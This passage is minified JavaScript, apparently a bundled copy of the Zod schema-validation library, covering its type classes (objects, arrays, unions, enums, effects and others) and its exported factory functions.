this.setLimit("max",e,!1,Ot.toString(n))}setLimit(e,n,r,i){return new Rp({...this._def,checks:[...this._def.checks,{kind:e,value:n,inclusive:r,message:Ot.toString(i)}]})}_addCheck(e){return new Rp({...this._def,checks:[...this._def.checks,e]})}positive(e){return this._addCheck({kind:"min",value:BigInt(0),inclusive:!1,message:Ot.toString(e)})}negative(e){return this._addCheck({kind:"max",value:BigInt(0),inclusive:!1,message:Ot.toString(e)})}nonpositive(e){return this._addCheck({kind:"max",value:BigInt(0),inclusive:!0,message:Ot.toString(e)})}nonnegative(e){return this._addCheck({kind:"min",value:BigInt(0),inclusive:!0,message:Ot.toString(e)})}multipleOf(e,n){return this._addCheck({kind:"multipleOf",value:e,message:Ot.toString(n)})}get minValue(){let e=null;for(const n of this._def.checks)n.kind==="min"&&(e===null||n.value>e)&&(e=n.value);return e}get maxValue(){let e=null;for(const n of this._def.checks)n.kind==="max"&&(e===null||n.value<e)&&(e=n.value);return e}}Rp.create=t=>{var e;return new Rp({checks:[],typeName:$t.ZodBigInt,coerce:(e=t?.coerce)!==null&&e!==void 0?e:!1,...Jt(t)})};class IE extends cn{_parse(e){if(this._def.coerce&&(e.data=!!e.data),this._getType(e)!==ct.boolean){const r=this._getOrReturnCtx(e);return gt(r,{code:Ze.invalid_type,expected:ct.boolean,received:r.parsedType}),Wt}return Eo(e.data)}}IE.create=t=>new IE({typeName:$t.ZodBoolean,coerce:t?.coerce||!1,...Jt(t)});class ng extends cn{_parse(e){if(this._def.coerce&&(e.data=new Date(e.data)),this._getType(e)!==ct.date){const s=this._getOrReturnCtx(e);return gt(s,{code:Ze.invalid_type,expected:ct.date,received:s.parsedType}),Wt}if(isNaN(e.data.getTime())){const s=this._getOrReturnCtx(e);return gt(s,{code:Ze.invalid_date}),Wt}const r=new Ks;let i;for(const s of this._def.checks)s.kind==="min"?e.data.getTime()<s.value&&(i=this._getOrReturnCtx(e,i),gt(i,{code:Ze.too_small,message:s.message,inclusive:!0,exact:!1,minimum:s.value,type:"date"}),r.dirty()):s.kind==="max"?e.data.getTime()>s.value&&(i=this._getOrReturnCtx(e,i),gt(i,{code:Ze.too_big,message:s.message,inclusive:!0,exact:!1,maximum:s.value,type:"date"}),r.dirty()):Un.assertNever(s);return{status:r.value,value:new Date(e.data.getTime())}}_addCheck(e){return new ng({...this._def,checks:[...this._def.checks,e]})}min(e,n){return this._addCheck({kind:"min",value:e.getTime(),message:Ot.toString(n)})}max(e,n){return this._addCheck({kind:"max",value:e.getTime(),message:Ot.toString(n)})}get minDate(){let e=null;for(const n of this._def.checks)n.kind==="min"&&(e===null||n.value>e)&&(e=n.value);return e!=null?new Date(e):null}get maxDate(){let e=null;for(const n of this._def.checks)n.kind==="max"&&(e===null||n.value<e)&&(e=n.value);return e!=null?new Date(e):null}}ng.create=t=>new ng({checks:[],coerce:t?.coerce||!1,typeName:$t.ZodDate,...Jt(t)});class lx extends cn{_parse(e){if(this._getType(e)!==ct.symbol){const r=this._getOrReturnCtx(e);return gt(r,{code:Ze.invalid_type,expected:ct.symbol,received:r.parsedType}),Wt}return Eo(e.data)}}lx.create=t=>new lx({typeName:$t.ZodSymbol,...Jt(t)});class RE extends cn{_parse(e){if(this._getType(e)!==ct.undefined){const r=this._getOrReturnCtx(e);return gt(r,{code:Ze.invalid_type,expected:ct.undefined,received:r.parsedType}),Wt}return Eo(e.data)}}RE.create=t=>new RE({typeName:$t.ZodUndefined,...Jt(t)});class PE extends cn{_parse(e){if(this._getType(e)!==ct.null){const r=this._getOrReturnCtx(e);return gt(r,{code:Ze.invalid_type,expected:ct.null,received:r.parsedType}),Wt}return Eo(e.data)}}PE.create=t=>new PE({typeName:$t.ZodNull,...Jt(t)});class b1 extends cn{constructor(){super(...arguments),this._any=!0}_parse(e){return Eo(e.data)}}b1.create=t=>new b1({typeName:$t.ZodAny,...Jt(t)});class Gm extends cn{constructor(){super(...arguments),this._unknown=!0}_parse(e){return Eo(e.data)}}Gm.create=t=>new Gm({typeName:$t.ZodUnknown,...Jt(t)});class If extends cn{_parse(e){const n=this._getOrReturnCtx(e);return gt(n,{code:Ze.invalid_type,expected:ct.never,received:n.parsedType}),Wt}}If.create=t=>new If({typeName:$t.ZodNever,...Jt(t)});class dx extends cn{_parse(e){if(this._getType(e)!==ct.undefined){const r=this._getOrReturnCtx(e);return gt(r,{code:Ze.invalid_type,expected:ct.void,received:r.parsedType}),Wt}return Eo(e.data)}}dx.create=t=>new dx({typeName:$t.ZodVoid,...Jt(t)});class ju extends cn{_parse(e){const{ctx:n,status:r}=this._processInputParams(e),i=this._def;if(n.parsedType!==ct.array)return gt(n,{code:Ze.invalid_type,expected:ct.array,received:n.parsedType}),Wt;if(i.exactLength!==null){const o=n.data.length>i.exactLength.value,a=n.data.length<i.exactLength.value;(o||a)&&(gt(n,{code:o?Ze.too_big:Ze.too_small,minimum:a?i.exactLength.value:void 0,maximum:o?i.exactLength.value:void 0,type:"array",inclusive:!0,exact:!0,message:i.exactLength.message}),r.dirty())}if(i.minLength!==null&&n.data.length<i.minLength.value&&(gt(n,{code:Ze.too_small,minimum:i.minLength.value,type:"array",inclusive:!0,exact:!1,message:i.minLength.message}),r.dirty()),i.maxLength!==null&&n.data.length>i.maxLength.value&&(gt(n,{code:Ze.too_big,maximum:i.maxLength.value,type:"array",inclusive:!0,exact:!1,message:i.maxLength.message}),r.dirty()),n.common.async)return Promise.all([...n.data].map((o,a)=>i.type._parseAsync(new Gl(n,o,n.path,a)))).then(o=>Ks.mergeArray(r,o));const s=[...n.data].map((o,a)=>i.type._parseSync(new Gl(n,o,n.path,a)));return Ks.mergeArray(r,s)}get element(){return this._def.type}min(e,n){return new ju({...this._def,minLength:{value:e,message:Ot.toString(n)}})}max(e,n){return new ju({...this._def,maxLength:{value:e,message:Ot.toString(n)}})}length(e,n){return new ju({...this._def,exactLength:{value:e,message:Ot.toString(n)}})}nonempty(e){return this.min(1,e)}}ju.create=(t,e)=>new ju({type:t,minLength:null,maxLength:null,exactLength:null,typeName:$t.ZodArray,...Jt(e)});function Db(t){if(t instanceof Wr){const e={};for(const n in t.shape){const r=t.shape[n];e[n]=Ef.create(Db(r))}return new Wr({...t._def,shape:()=>e})}else return t instanceof ju?new ju({...t._def,type:Db(t.element)}):t instanceof Ef?Ef.create(Db(t.unwrap())):t instanceof ig?ig.create(Db(t.unwrap())):t instanceof Kl?Kl.create(t.items.map(e=>Db(e))):t}class Wr extends cn{constructor(){super(...arguments),this._cached=null,this.nonstrict=this.passthrough,this.augment=this.extend}_getCached(){if(this._cached!==null)return this._cached;const e=this._def.shape(),n=Un.objectKeys(e);return this._cached={shape:e,keys:n}}_parse(e){if(this._getType(e)!==ct.object){const l=this._getOrReturnCtx(e);return gt(l,{code:Ze.invalid_type,expected:ct.object,received:l.parsedType}),Wt}const{status:r,ctx:i}=this._processInputParams(e),{shape:s,keys:o}=this._getCached(),a=[];if(!(this._def.catchall instanceof If&&this._def.unknownKeys==="strip"))for(const l in i.data)o.includes(l)||a.push(l);const c=[];for(const l of o){const f=s[l],h=i.data[l];c.push({key:{status:"valid",value:l},value:f._parse(new Gl(i,h,i.path,l)),alwaysSet:l in i.data})}if(this._def.catchall instanceof If){const l=this._def.unknownKeys;if(l==="passthrough")for(const f of a)c.push({key:{status:"valid",value:f},value:{status:"valid",value:i.data[f]}});else if(l==="strict")a.length>0&&(gt(i,{code:Ze.unrecognized_keys,keys:a}),r.dirty());else if(l!=="strip")throw new Error("Internal ZodObject error: invalid unknownKeys value.")}else{const l=this._def.catchall;for(const f of a){const h=i.data[f];c.push({key:{status:"valid",value:f},value:l._parse(new Gl(i,h,i.path,f)),alwaysSet:f in i.data})}}return i.common.async?Promise.resolve().then(async()=>{const l=[];for(const f of c){const h=await f.key;l.push({key:h,value:await f.value,alwaysSet:f.alwaysSet})}return l}).then(l=>Ks.mergeObjectSync(r,l)):Ks.mergeObjectSync(r,c)}get shape(){return this._def.shape()}strict(e){return Ot.errToObj,new Wr({...this._def,unknownKeys:"strict",...e!==void 0?{errorMap:(n,r)=>{var i,s,o,a;const c=(o=(s=(i=this._def).errorMap)===null||s===void 0?void 0:s.call(i,n,r).message)!==null&&o!==void 0?o:r.defaultError;return n.code==="unrecognized_keys"?{message:(a=Ot.errToObj(e).message)!==null&&a!==void 0?a:c}:{message:c}}}:{}})}strip(){return new Wr({...this._def,unknownKeys:"strip"})}passthrough(){return new Wr({...this._def,unknownKeys:"passthrough"})}extend(e){return new Wr({...this._def,shape:()=>({...this._def.shape(),...e})})}merge(e){return new Wr({unknownKeys:e._def.unknownKeys,catchall:e._def.catchall,shape:()=>({...this._def.shape(),...e._def.shape()}),typeName:$t.ZodObject})}setKey(e,n){return this.augment({[e]:n})}catchall(e){return new Wr({...this._def,catchall:e})}pick(e){const n={};return Un.objectKeys(e).forEach(r=>{e[r]&&this.shape[r]&&(n[r]=this.shape[r])}),new Wr({...this._def,shape:()=>n})}omit(e){const n={};return Un.objectKeys(this.shape).forEach(r=>{e[r]||(n[r]=this.shape[r])}),new Wr({...this._def,shape:()=>n})}deepPartial(){return Db(this)}partial(e){const n={};return Un.objectKeys(this.shape).forEach(r=>{const i=this.shape[r];e&&!e[r]?n[r]=i:n[r]=i.optional()}),new Wr({...this._def,shape:()=>n})}required(e){const n={};return Un.objectKeys(this.shape).forEach(r=>{if(e&&!e[r])n[r]=this.shape[r];else{let s=this.shape[r];for(;s instanceof Ef;)s=s._def.innerType;n[r]=s}}),new Wr({...this._def,shape:()=>n})}keyof(){return Sre(Un.objectKeys(this.shape))}}Wr.create=(t,e)=>new Wr({shape:()=>t,unknownKeys:"strip",catchall:If.create(),typeName:$t.ZodObject,...Jt(e)});Wr.strictCreate=(t,e)=>new Wr({shape:()=>t,unknownKeys:"strict",catchall:If.create(),typeName:$t.ZodObject,...Jt(e)});Wr.lazycreate=(t,e)=>new Wr({shape:t,unknownKeys:"strip",catchall:If.create(),typeName:$t.ZodObject,...Jt(e)});class NE extends cn{_parse(e){const{ctx:n}=this._processInputParams(e),r=this._def.options;function i(s){for(const a of s)if(a.result.status==="valid")return a.result;for(const a of s)if(a.result.status==="dirty")return n.common.issues.push(...a.ctx.common.issues),a.result;const o=s.map(a=>new Bu(a.ctx.common.issues));return gt(n,{code:Ze.invalid_union,unionErrors:o}),Wt}if(n.common.async)return Promise.all(r.map(async s=>{const o={...n,common:{...n.common,issues:[]},parent:null};return{result:await s._parseAsync({data:n.data,path:n.path,parent:o}),ctx:o}})).then(i);{let s;const o=[];for(const c of r){const l={...n,common:{...n.common,issues:[]},parent:null},f=c._parseSync({data:n.data,path:n.path,parent:l});if(f.status==="valid")return f;f.status==="dirty"&&!s&&(s={result:f,ctx:l}),l.common.issues.length&&o.push(l.common.issues)}if(s)return n.common.issues.push(...s.ctx.common.issues),s.result;const a=o.map(c=>new Bu(c));return gt(n,{code:Ze.invalid_union,unionErrors:a}),Wt}}get options(){return this._def.options}}NE.create=(t,e)=>new NE({options:t,typeName:$t.ZodUnion,...Jt(e)});const FT=t=>t instanceof DE?FT(t.schema):t instanceof Uu?FT(t.innerType()):t instanceof BE?[t.value]:t instanceof Pp?t.options:t instanceof jE?Object.keys(t.enum):t instanceof ME?FT(t._def.innerType):t instanceof RE?[void 0]:t instanceof PE?[null]:null;class UI extends cn{_parse(e){const{ctx:n}=this._processInputParams(e);if(n.parsedType!==ct.object)return gt(n,{code:Ze.invalid_type,expected:ct.object,received:n.parsedType}),Wt;const r=this.discriminator,i=n.data[r],s=this.optionsMap.get(i);return s?n.common.async?s._parseAsync({data:n.data,path:n.path,parent:n}):s._parseSync({data:n.data,path:n.path,parent:n}):(gt(n,{code:Ze.invalid_union_discriminator,options:Array.from(this.optionsMap.keys()),path:[r]}),Wt)}get discriminator(){return this._def.discriminator}get options(){return this._def.options}get optionsMap(){return this._def.optionsMap}static create(e,n,r){const i=new Map;for(const s of n){const o=FT(s.shape[e]);if(!o)throw new Error(`A discriminator value for key \`${e}\` could not be extracted from all schema options`);for(const a of o){if(i.has(a))throw new Error(`Discriminator property ${String(e)} has duplicate value ${String(a)}`);i.set(a,s)}}return new UI({typeName:$t.ZodDiscriminatedUnion,discriminator:e,options:n,optionsMap:i,...Jt(r)})}}function Ok(t,e){const n=lp(t),r=lp(e);if(t===e)return{valid:!0,data:t};if(n===ct.object&&r===ct.object){const i=Un.objectKeys(e),s=Un.objectKeys(t).filter(a=>i.indexOf(a)!==-1),o={...t,...e};for(const a of s){const c=Ok(t[a],e[a]);if(!c.valid)return{valid:!1};o[a]=c.data}return{valid:!0,data:o}}else if(n===ct.array&&r===ct.array){if(t.length!==e.length)return{valid:!1};const i=[];for(let s=0;s<t.length;s++){const o=t[s],a=e[s],c=Ok(o,a);if(!c.valid)return{valid:!1};i.push(c.data)}return{valid:!0,data:i}}else return n===ct.date&&r===ct.date&&+t==+e?{valid:!0,data:t}:{valid:!1}}class OE extends cn{_parse(e){const{status:n,ctx:r}=this._processInputParams(e),i=(s,o)=>{if(Pk(s)||Pk(o))return Wt;const a=Ok(s.value,o.value);return a.valid?((Nk(s)||Nk(o))&&n.dirty(),{status:n.value,value:a.data}):(gt(r,{code:Ze.invalid_intersection_types}),Wt)};return r.common.async?Promise.all([this._def.left._parseAsync({data:r.data,path:r.path,parent:r}),this._def.right._parseAsync({data:r.data,path:r.path,parent:r})]).then(([s,o])=>i(s,o)):i(this._def.left._parseSync({data:r.data,path:r.path,parent:r}),this._def.right._parseSync({data:r.data,path:r.path,parent:r}))}}OE.create=(t,e,n)=>new OE({left:t,right:e,typeName:$t.ZodIntersection,...Jt(n)});class Kl extends cn{_parse(e){const{status:n,ctx:r}=this._processInputParams(e);if(r.parsedType!==ct.array)return gt(r,{code:Ze.invalid_type,expected:ct.array,received:r.parsedType}),Wt;if(r.data.length<this._def.items.length)return gt(r,{code:Ze.too_small,minimum:this._def.items.length,inclusive:!0,exact:!1,type:"array"}),Wt;!this._def.rest&&r.data.length>this._def.items.length&&(gt(r,{code:Ze.too_big,maximum:this._def.items.length,inclusive:!0,exact:!1,type:"array"}),n.dirty());const s=[...r.data].map((o,a)=>{const c=this._def.items[a]||this._def.rest;return c?c._parse(new Gl(r,o,r.path,a)):null}).filter(o=>!!o);return r.common.async?Promise.all(s).then(o=>Ks.mergeArray(n,o)):Ks.mergeArray(n,s)}get items(){return this._def.items}rest(e){return new Kl({...this._def,rest:e})}}Kl.create=(t,e)=>{if(!Array.isArray(t))throw new Error("You must pass an array of schemas to z.tuple([ ... ])");return new Kl({items:t,typeName:$t.ZodTuple,rest:null,...Jt(e)})};class kE extends cn{get keySchema(){return this._def.keyType}get valueSchema(){return this._def.valueType}_parse(e){const{status:n,ctx:r}=this._processInputParams(e);if(r.parsedType!==ct.object)return gt(r,{code:Ze.invalid_type,expected:ct.object,received:r.parsedType}),Wt;const i=[],s=this._def.keyType,o=this._def.valueType;for(const a in r.data)i.push({key:s._parse(new Gl(r,a,r.path,a)),value:o._parse(new Gl(r,r.data[a],r.path,a))});return r.common.async?Ks.mergeObjectAsync(n,i):Ks.mergeObjectSync(n,i)}get element(){return this._def.valueType}static create(e,n,r){return n instanceof cn?new kE({keyType:e,valueType:n,typeName:$t.ZodRecord,...Jt(r)}):new kE({keyType:Ou.create(),valueType:e,typeName:$t.ZodRecord,...Jt(n)})}}class fx extends cn{get keySchema(){return this._def.keyType}get valueSchema(){return this._def.valueType}_parse(e){const{status:n,ctx:r}=this._processInputParams(e);if(r.parsedType!==ct.map)return gt(r,{code:Ze.invalid_type,expected:ct.map,received:r.parsedType}),Wt;const i=this._def.keyType,s=this._def.valueType,o=[...r.data.entries()].map(([a,c],l)=>({key:i._parse(new Gl(r,a,r.path,[l,"key"])),value:s._parse(new Gl(r,c,r.path,[l,"value"]))}));if(r.common.async){const a=new Map;return Promise.resolve().then(async()=>{for(const c of o){const l=await c.key,f=await c.value;if(l.status==="aborted"||f.status==="aborted")return Wt;(l.status==="dirty"||f.status==="dirty")&&n.dirty(),a.set(l.value,f.value)}return{status:n.value,value:a}})}else{const a=new Map;for(const c of o){const l=c.key,f=c.value;if(l.status==="aborted"||f.status==="aborted")return Wt;(l.status==="dirty"||f.status==="dirty")&&n.dirty(),a.set(l.value,f.value)}return{status:n.value,value:a}}}}fx.create=(t,e,n)=>new fx({valueType:e,keyType:t,typeName:$t.ZodMap,...Jt(n)});class rg extends cn{_parse(e){const{status:n,ctx:r}=this._processInputParams(e);if(r.parsedType!==ct.set)return gt(r,{code:Ze.invalid_type,expected:ct.set,received:r.parsedType}),Wt;const i=this._def;i.minSize!==null&&r.data.size<i.minSize.value&&(gt(r,{code:Ze.too_small,minimum:i.minSize.value,type:"set",inclusive:!0,exact:!1,message:i.minSize.message}),n.dirty()),i.maxSize!==null&&r.data.size>i.maxSize.value&&(gt(r,{code:Ze.too_big,maximum:i.maxSize.value,type:"set",inclusive:!0,exact:!1,message:i.maxSize.message}),n.dirty());const s=this._def.valueType;function o(c){const l=new Set;for(const f of c){if(f.status==="aborted")return Wt;f.status==="dirty"&&n.dirty(),l.add(f.value)}return{status:n.value,value:l}}const a=[...r.data.values()].map((c,l)=>s._parse(new Gl(r,c,r.path,l)));return r.common.async?Promise.all(a).then(c=>o(c)):o(a)}min(e,n){return new rg({...this._def,minSize:{value:e,message:Ot.toString(n)}})}max(e,n){return new rg({...this._def,maxSize:{value:e,message:Ot.toString(n)}})}size(e,n){return this.min(e,n).max(e,n)}nonempty(e){return this.min(1,e)}}rg.create=(t,e)=>new rg({valueType:t,minSize:null,maxSize:null,typeName:$t.ZodSet,...Jt(e)});class Jb extends cn{constructor(){super(...arguments),this.validate=this.implement}_parse(e){const{ctx:n}=this._processInputParams(e);if(n.parsedType!==ct.function)return gt(n,{code:Ze.invalid_type,expected:ct.function,received:n.parsedType}),Wt;function r(a,c){return cx({data:a,path:n.path,errorMaps:[n.common.contextualErrorMap,n.schemaErrorMap,ax(),TE].filter(l=>!!l),issueData:{code:Ze.invalid_arguments,argumentsError:c}})}function i(a,c){return cx({data:a,path:n.path,errorMaps:[n.common.contextualErrorMap,n.schemaErrorMap,ax(),TE].filter(l=>!!l),issueData:{code:Ze.invalid_return_type,returnTypeError:c}})}const s={errorMap:n.common.contextualErrorMap},o=n.data;if(this._def.returns instanceof w1){const a=this;return Eo(async function(...c){const l=new Bu([]),f=await a._def.args.parseAsync(c,s).catch(b=>{throw l.addIssue(r(c,b)),l}),h=await Reflect.apply(o,this,f);return await a._def.returns._def.type.parseAsync(h,s).catch(b=>{throw l.addIssue(i(h,b)),l})})}else{const a=this;return Eo(function(...c){const l=a._def.args.safeParse(c,s);if(!l.success)throw new Bu([r(c,l.error)]);const f=Reflect.apply(o,this,l.data),h=a._def.returns.safeParse(f,s);if(!h.success)throw new Bu([i(f,h.error)]);return h.data})}}parameters(){return this._def.args}returnType(){return this._def.returns}args(...e){return new Jb({...this._def,args:Kl.create(e).rest(Gm.create())})}returns(e){return new Jb({...this._def,returns:e})}implement(e){return this.parse(e)}strictImplement(e){return this.parse(e)}static create(e,n,r){return new Jb({args:e||Kl.create([]).rest(Gm.create()),returns:n||Gm.create(),typeName:$t.ZodFunction,...Jt(r)})}}class DE extends cn{get schema(){return this._def.getter()}_parse(e){const{ctx:n}=this._processInputParams(e);return this._def.getter()._parse({data:n.data,path:n.path,parent:n})}}DE.create=(t,e)=>new DE({getter:t,typeName:$t.ZodLazy,...Jt(e)});class BE extends cn{_parse(e){if(e.data!==this._def.value){const n=this._getOrReturnCtx(e);return gt(n,{received:n.data,code:Ze.invalid_literal,expected:this._def.value}),Wt}return{status:"valid",value:e.data}}get value(){return this._def.value}}BE.create=(t,e)=>new BE({value:t,typeName:$t.ZodLiteral,...Jt(e)});function Sre(t,e){return new Pp({values:t,typeName:$t.ZodEnum,...Jt(e)})}class Pp extends cn{_parse(e){if(typeof e.data!="string"){const n=this._getOrReturnCtx(e),r=this._def.values;return gt(n,{expected:Un.joinValues(r),received:n.parsedType,code:Ze.invalid_type}),Wt}if(this._def.values.indexOf(e.data)===-1){const n=this._getOrReturnCtx(e),r=this._def.values;return gt(n,{received:n.data,code:Ze.invalid_enum_value,options:r}),Wt}return Eo(e.data)}get options(){return this._def.values}get enum(){const e={};for(const n of this._def.values)e[n]=n;return e}get Values(){const e={};for(const n of this._def.values)e[n]=n;return e}get Enum(){const e={};for(const n of this._def.values)e[n]=n;return e}extract(e){return Pp.create(e)}exclude(e){return Pp.create(this.options.filter(n=>!e.includes(n)))}}Pp.create=Sre;class jE extends cn{_parse(e){const n=Un.getValidEnumValues(this._def.values),r=this._getOrReturnCtx(e);if(r.parsedType!==ct.string&&r.parsedType!==ct.number){const i=Un.objectValues(n);return gt(r,{expected:Un.joinValues(i),received:r.parsedType,code:Ze.invalid_type}),Wt}if(n.indexOf(e.data)===-1){const i=Un.objectValues(n);return gt(r,{received:r.data,code:Ze.invalid_enum_value,options:i}),Wt}return Eo(e.data)}get enum(){return this._def.values}}jE.create=(t,e)=>new jE({values:t,typeName:$t.ZodNativeEnum,...Jt(e)});class w1 extends cn{unwrap(){return this._def.type}_parse(e){const{ctx:n}=this._processInputParams(e);if(n.parsedType!==ct.promise&&n.common.async===!1)return gt(n,{code:Ze.invalid_type,expected:ct.promise,received:n.parsedType}),Wt;const r=n.parsedType===ct.promise?n.data:Promise.resolve(n.data);return Eo(r.then(i=>this._def.type.parseAsync(i,{path:n.path,errorMap:n.common.contextualErrorMap})))}}w1.create=(t,e)=>new w1({type:t,typeName:$t.ZodPromise,...Jt(e)});class Uu extends cn{innerType(){return this._def.schema}sourceType(){return this._def.schema._def.typeName===$t.ZodEffects?this._def.schema.sourceType():this._def.schema}_parse(e){const{status:n,ctx:r}=this._processInputParams(e),i=this._def.effect||null,s={addIssue:o=>{gt(r,o),o.fatal?n.abort():n.dirty()},get path(){return r.path}};if(s.addIssue=s.addIssue.bind(s),i.type==="preprocess"){const o=i.transform(r.data,s);return r.common.issues.length?{status:"dirty",value:r.data}:r.common.async?Promise.resolve(o).then(a=>this._def.schema._parseAsync({data:a,path:r.path,parent:r})):this._def.schema._parseSync({data:o,path:r.path,parent:r})}if(i.type==="refinement"){const o=a=>{const c=i.refinement(a,s);if(r.common.async)return Promise.resolve(c);if(c instanceof Promise)throw new Error("Async refinement encountered during synchronous parse operation. Use .parseAsync instead.");return a};if(r.common.async===!1){const a=this._def.schema._parseSync({data:r.data,path:r.path,parent:r});return a.status==="aborted"?Wt:(a.status==="dirty"&&n.dirty(),o(a.value),{status:n.value,value:a.value})}else return this._def.schema._parseAsync({data:r.data,path:r.path,parent:r}).then(a=>a.status==="aborted"?Wt:(a.status==="dirty"&&n.dirty(),o(a.value).then(()=>({status:n.value,value:a.value}))))}if(i.type==="transform")if(r.common.async===!1){const o=this._def.schema._parseSync({data:r.data,path:r.path,parent:r});if(!xE(o))return o;const a=i.transform(o.value,s);if(a instanceof Promise)throw new Error("Asynchronous transform encountered during synchronous parse operation. Use .parseAsync instead.");return{status:n.value,value:a}}else return this._def.schema._parseAsync({data:r.data,path:r.path,parent:r}).then(o=>xE(o)?Promise.resolve(i.transform(o.value,s)).then(a=>({status:n.value,value:a})):o);Un.assertNever(i)}}Uu.create=(t,e,n)=>new Uu({schema:t,typeName:$t.ZodEffects,effect:e,...Jt(n)});Uu.createWithPreprocess=(t,e,n)=>new Uu({schema:e,effect:{type:"preprocess",transform:t},typeName:$t.ZodEffects,...Jt(n)});class Ef extends cn{_parse(e){return this._getType(e)===ct.undefined?Eo(void 0):this._def.innerType._parse(e)}unwrap(){return this._def.innerType}}Ef.create=(t,e)=>new Ef({innerType:t,typeName:$t.ZodOptional,...Jt(e)});class ig extends cn{_parse(e){return this._getType(e)===ct.null?Eo(null):this._def.innerType._parse(e)}unwrap(){return this._def.innerType}}ig.create=(t,e)=>new ig({innerType:t,typeName:$t.ZodNullable,...Jt(e)});class ME extends cn{_parse(e){const{ctx:n}=this._processInputParams(e);let r=n.data;return n.parsedType===ct.undefined&&(r=this._def.defaultValue()),this._def.innerType._parse({data:r,path:n.path,parent:n})}removeDefault(){return this._def.innerType}}ME.create=(t,e)=>new ME({innerType:t,typeName:$t.ZodDefault,defaultValue:typeof e.default=="function"?e.default:()=>e.default,...Jt(e)});class hx extends cn{_parse(e){const{ctx:n}=this._processInputParams(e),r={...n,common:{...n.common,issues:[]}},i=this._def.innerType._parse({data:r.data,path:r.path,parent:{...r}});return ux(i)?i.then(s=>({status:"valid",value:s.status==="valid"?s.value:this._def.catchValue({get error(){return new Bu(r.common.issues)},input:r.data})})):{status:"valid",value:i.status==="valid"?i.value:this._def.catchValue({get error(){return new Bu(r.common.issues)},input:r.data})}}removeCatch(){return this._def.innerType}}hx.create=(t,e)=>new hx({innerType:t,typeName:$t.ZodCatch,catchValue:typeof e.catch=="function"?e.catch:()=>e.catch,...Jt(e)});class px extends cn{_parse(e){if(this._getType(e)!==ct.nan){const r=this._getOrReturnCtx(e);return gt(r,{code:Ze.invalid_type,expected:ct.nan,received:r.parsedType}),Wt}return{status:"valid",value:e.data}}}px.create=t=>new px({typeName:$t.ZodNaN,...Jt(t)});const Nme=Symbol("zod_brand");class Tre extends cn{_parse(e){const{ctx:n}=this._processInputParams(e),r=n.data;return this._def.type._parse({data:r,path:n.path,parent:n})}unwrap(){return this._def.type}}class V_ extends cn{_parse(e){const{status:n,ctx:r}=this._processInputParams(e);if(r.common.async)return(async()=>{const s=await this._def.in._parseAsync({data:r.data,path:r.path,parent:r});return s.status==="aborted"?Wt:s.status==="dirty"?(n.dirty(),Cre(s.value)):this._def.out._parseAsync({data:s.value,path:r.path,parent:r})})();{const i=this._def.in._parseSync({data:r.data,path:r.path,parent:r});return i.status==="aborted"?Wt:i.status==="dirty"?(n.dirty(),{status:"dirty",value:i.value}):this._def.out._parseSync({data:i.value,path:r.path,parent:r})}}static create(e,n){return new V_({in:e,out:n,typeName:$t.ZodPipeline})}}class mx extends cn{_parse(e){const n=this._def.innerType._parse(e);return xE(n)&&(n.value=Object.freeze(n.value)),n}}mx.create=(t,e)=>new mx({innerType:t,typeName:$t.ZodReadonly,...Jt(e)});const xre=(t,e={},n)=>t?b1.create().superRefine((r,i)=>{var s,o;if(!t(r)){const a=typeof e=="function"?e(r):typeof e=="string"?{message:e}:e,c=(o=(s=a.fatal)!==null&&s!==void 0?s:n)!==null&&o!==void 0?o:!0,l=typeof a=="string"?{message:a}:a;i.addIssue({code:"custom",...l,fatal:c})}}):b1.create(),Ome={object:Wr.lazycreate};var $t;(function(t){t.ZodString="ZodString",t.ZodNumber="ZodNumber",t.ZodNaN="ZodNaN",t.ZodBigInt="ZodBigInt",t.ZodBoolean="ZodBoolean",t.ZodDate="ZodDate",t.ZodSymbol="ZodSymbol",t.ZodUndefined="ZodUndefined",t.ZodNull="ZodNull",t.ZodAny="ZodAny",t.ZodUnknown="ZodUnknown",t.ZodNever="ZodNever",t.ZodVoid="ZodVoid",t.ZodArray="ZodArray",t.ZodObject="ZodObject",t.ZodUnion="ZodUnion",t.ZodDiscriminatedUnion="ZodDiscriminatedUnion",t.ZodIntersection="ZodIntersection",t.ZodTuple="ZodTuple",t.ZodRecord="ZodRecord",t.ZodMap="ZodMap",t.ZodSet="ZodSet",t.ZodFunction="ZodFunction",t.ZodLazy="ZodLazy",t.ZodLiteral="ZodLiteral",t.ZodEnum="ZodEnum",t.ZodEffects="ZodEffects",t.ZodNativeEnum="ZodNativeEnum",t.ZodOptional="ZodOptional",t.ZodNullable="ZodNullable",t.ZodDefault="ZodDefault",t.ZodCatch="ZodCatch",t.ZodPromise="ZodPromise",t.ZodBranded="ZodBranded",t.ZodPipeline="ZodPipeline",t.ZodReadonly="ZodReadonly"})($t||($t={}));const kme=(t,e={message:`Input not instance of ${t.name}`})=>xre(n=>n instanceof t,e),Ire=Ou.create,Rre=Ip.create,Dme=px.create,Bme=Rp.create,Pre=IE.create,jme=ng.create,Mme=lx.create,Ume=RE.create,Lme=PE.create,Fme=b1.create,$me=Gm.create,Hme=If.create,zme=dx.create,qme=ju.create,Vme=Wr.create,Wme=Wr.strictCreate,Gme=NE.create,Kme=UI.create,Zme=OE.create,Yme=Kl.create,Qme=kE.create,Jme=fx.create,Xme=rg.create,ege=Jb.create,tge=DE.create,nge=BE.create,rge=Pp.create,ige=jE.create,sge=w1.create,oH=Uu.create,oge=Ef.create,age=ig.create,cge=Uu.createWithPreprocess,uge=V_.create,lge=()=>Ire().optional(),dge=()=>Rre().optional(),fge=()=>Pre().optional(),hge={string:(t=>Ou.create({...t,coerce:!0})),number:(t=>Ip.create({...t,coerce:!0})),boolean:(t=>IE.create({...t,coerce:!0})),bigint:(t=>Rp.create({...t,coerce:!0})),date:(t=>ng.create({...t,coerce:!0}))},pge=Wt;var ee=Object.freeze({__proto__:null,defaultErrorMap:TE,setErrorMap:bme,getErrorMap:ax,makeIssue:cx,EMPTY_PATH:wme,addIssueToContext:gt,ParseStatus:Ks,INVALID:Wt,DIRTY:Cre,OK:Eo,isAborted:Pk,isDirty:Nk,isValid:xE,isAsync:ux,get util(){return Un},get objectUtil(){return 